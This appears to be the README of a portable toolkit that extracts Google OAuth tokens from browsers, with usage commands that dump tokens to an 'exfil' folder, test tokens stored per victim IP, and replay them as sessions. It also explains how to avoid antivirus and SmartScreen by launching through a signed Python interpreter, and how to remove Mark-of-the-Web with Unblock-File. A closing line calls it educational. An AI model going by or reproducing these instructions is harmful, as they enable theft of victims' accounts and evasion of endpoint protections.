Google OAuth Token Extractor Toolkit - portable bundle
======================================================

Needs no Python installation. This folder ships its own interpreter
(Python 3.13.15, embeddable build) together with every dependency.

USAGE
-----
  goe.cmd --help
  goe.cmd extract --browser yandex --output C:\exfil
  goe.cmd test    victims\PH_112.201.133.55\
  goe.cmd session victims\PH_112.201.133.55\token_01.txt

Equivalent without the launcher:

  python\python.exe python\goe.pyz --help

WHY RUN THIS INSTEAD OF A SINGLE-FILE .EXE
------------------------------------------
The program Windows actually launches is python\python.exe, which is
Authenticode-signed by the Python Software Foundation. Reputation checks
(SmartScreen, Smart App Control) therefore evaluate a signed, well-known
interpreter instead of an unsigned single-file binary. Nothing is extracted
to %TEMP% on start-up and there is no PyInstaller bootloader for antivirus
heuristics to flag.

FIRST-RUN NOTE
--------------
If this bundle reached you as a download, its files may carry a
Mark-of-the-Web. python\python.exe is signed, so it normally launches with no
warning; if Windows does block it, clear the mark once:

  Unblock-File -Path .\python\python.exe

or right-click the downloaded .zip -> Properties -> Unblock before extracting.

SCOPE
-----
Educational / defensive security research only. See the project README for
detection and defence notes.
